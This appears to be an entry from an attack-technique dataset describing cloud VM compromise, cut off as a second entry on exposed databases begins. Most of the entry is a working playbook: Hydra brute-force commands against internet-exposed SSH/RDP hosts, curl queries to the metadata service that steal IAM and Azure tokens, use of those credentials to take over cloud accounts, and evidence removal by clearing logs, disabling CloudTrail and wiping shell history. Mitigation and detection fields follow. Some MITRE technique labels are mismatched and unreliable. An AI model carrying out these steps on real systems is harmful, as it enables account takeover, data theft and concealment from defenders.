Attack Steps: Step 1: Discover Cloud Instance with Open SSH or RDP - Use shodan.io or censys.io and search for keywords like port:22 or port:3389 to find exposed cloud VMs. Note down the public IP address of a Linux (SSH) or Windows (RDP) machine. Step 2: Attempt Login with Brute Force or Leaked Credentials - Use Hydra to brute force SSH: hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> OR for RDP: hydra -t 4 -V -f -l Administrator -P passwords.txt rdp://<target-ip>. If credentials are known or leaked, try directly with ssh or RDP client. Step 3: Upon Login, Enumerate the Environment - Check if this is a cloud VM. On AWS EC2, look for /sys/hypervisor/uuid starting with ec2. Step 4: Query the Instance Metadata Service (IMDS) - On AWS: Run curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get the role name. Then: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> to get temporary access key, secret, and session token. On Azure: Use curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" to get metadata. For tokens: curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01". Step 5: Use Stolen Credentials to Access Cloud Resources - For AWS: Use aws configure with the stolen credentials. Then list buckets: aws s3 ls, list EC2s: aws ec2 describe-instances, etc. Step 6: Lateral Movement or Persistence - If permissions allow, spin up instances, access secrets, or elevate access. You may create new IAM users or steal data from S3. Step 7: (Optional) Remove Evidence - Clear logs, or disable CloudTrail temporarily (if permissions allow), or delete entries from .bash_history.
Target Type: Cloud VM (AWS EC2, Azure VM, GCP Compute)
Vulnerability: Publicly Accessible Ports + IMDS v1/weakly configured IMDS v2
MITRE Technique: T1552.005 (Unsecured Credentials), T1557.001 (Man-in-the-Middle), T1078 (Valid Accounts), T1086 (Command and Scripting Interpreter)
Impact: Full account takeover, IAM role compromise, access to storage, pivoting across services
Detection Method: Cloud logs, VPC flow logs, CloudTrail, analyze login sources, brute-force attempt logs
Solution: 1. Use firewall/NACL to block SSH/RDP from public. Allow only trusted IPs. 2. Use IMDSv2 only with hop-limit 1. 3. Enforce MFA, strong passwords. 4. Disable unused services. 5. Monitor logs. 6. Use Bastion Host for access.
Tags: cloud, imds, ssh, rdp, aws, azure, cloud security, metadata, misconfig, pentest

Title: Exploiting IMDS via Open Database Ports
Attack Type: Misconfigured Database Exposure + Metadata Service Exploitation
Scenario Description: A database (MySQL, MongoDB, Redis) running on a cloud VM is exposed to the internet without authentication or IP restrictions. Attacker gains access, achieves remote command execution or shell, and extracts IMDS metadata and temporary credentials to access cloud resources.
